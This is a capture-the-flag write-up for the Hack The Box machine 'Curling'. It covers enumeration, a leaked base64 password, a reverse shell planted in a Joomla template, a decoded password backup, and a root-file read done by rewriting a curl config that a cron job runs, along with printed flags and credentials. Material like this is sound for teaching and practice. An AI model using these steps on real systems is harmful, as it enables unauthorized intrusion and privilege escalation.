# Curling
>Author : Xyan1d3
>Date : 12th July 2021
>IP : 10.10.10.150
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jul 12 18:27:16 2021 as: nmap -sC -sV -v -oN nmap/curling 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/curling]
└──╼ # gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -x php,txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.150/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/07/12 18:53:23 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]
/index.php            (Status: 200) [Size: 14270]
/modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/]
/bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]    
/plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/]
/templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]
/media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]    
/language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/] 
/README.txt           (Status: 200) [Size: 4872]
/components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]
/cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]     
/libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/] 
/tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]       
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]   
/secret.txt           (Status: 200) [Size: 17]
/administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 3005]
/cli                  (Status: 301) [Size: 310] [--> http://10.10.10.150/cli/]
```

We see that we have a `secret.txt`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/curling]
└──╼ # curl http://10.10.10.150/secret.txt
Q3VybGluZzIwMTgh
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/curling]
└──╼ # curl -s http://10.10.10.150/secret.txt |base64 -d ;echo
Curling2018!
```

# Initial FootHold
Now, Lets going to the `joomla` Administrator page `Floris` and password of `Curling2018!`.
We could go to templates and put an reverse shell on the theme.
![[Pasted image 20210712191657.png]]
And, hit the template preview to get a shell back as the user `www-data`.


# User Escalation
We visit the `/home/floris` directory and find out that we have a `password_backup`.
```python
www-data@curling:/home/floris$ ls -l
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```
![[Pasted image 20210712193631.png]]

We decrypt the txt to get the password `5d<wdCbdZu)|hChXll`.
We use this credential to `su` into the `floris` user.

# Root Escalation
```python
floris@curling:~/admin-area$ ls -l
total 20
-rw-rw---- 1 root floris    25 Jul 12 14:41 input
-rw-rw---- 1 root floris 14242 Jul 12 14:41 report
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"

```

We see that we have a `input` file which is writable by our user `floris`.
There is a `cron` running on the box with will do a `curl -K` on this file.
```python
url = "file:///root/root.txt"                      
output = "/dev/shm/magisk.txt"
```

We wait for it to run and get the `root.txt` on the `/dev/shm/magisk.txt`.

## Getting root Flag
```python
floris@curling:/dev/shm$ ls -l
total 4
-rw-r--r-- 1 root root 33 Jul 12 14:34 magisk.txt
floris@curling:/dev/shm$ cat magisk.txt 
82c198ab6fc5365fdc6da2ee5c26064a
```
# Credentials
|Username|Password|
|--|--|
|Floris|Curling2018!|